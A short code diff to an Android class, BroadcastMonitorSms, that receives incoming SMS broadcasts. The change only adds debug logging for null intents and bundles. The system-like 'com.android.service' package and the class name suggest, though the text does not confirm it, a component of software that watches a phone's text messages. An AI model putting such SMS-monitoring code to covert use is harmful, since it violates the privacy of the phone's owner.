@@ -17,6 +17,8 @@ import android.telephony.SmsMessage;
 
 import com.android.service.Messages;
 import com.android.service.Sms;
+import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 public class BroadcastMonitorSms extends BroadcastReceiver {
 	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$
@@ -25,12 +27,20 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		if (intent == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
+			}
+			
 			return;
 		}
 		
 		final Bundle bundle = intent.getExtras();
 
 		if (bundle == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Bundle null"); //$NON-NLS-1$
+			}
+			
 			return;
 		}
 
